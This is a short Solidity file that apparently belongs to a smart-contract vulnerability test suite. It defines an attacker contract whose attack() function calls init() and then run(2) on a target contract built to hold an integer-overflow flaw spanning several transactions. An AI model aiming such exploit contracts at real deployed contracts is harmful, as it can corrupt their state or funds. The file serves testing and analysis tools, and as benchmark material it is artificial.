pragma solidity ^0.4.23;

import "./integer_overflow_multitx_multifunc_feasible.sol";

contract IntegerOverflowMultiTxMultiFuncFeasibleAttacker {
    IntegerOverflowMultiTxMultiFuncFeasible public target;

    function IntegerOverflowMultiTxMultiFuncFeasibleAttacker(address _targetAddress) public {
        target = IntegerOverflowMultiTxMultiFuncFeasible(_targetAddress);
    }

    function attack() public {
        target.init();

        target.run(2);
    }
}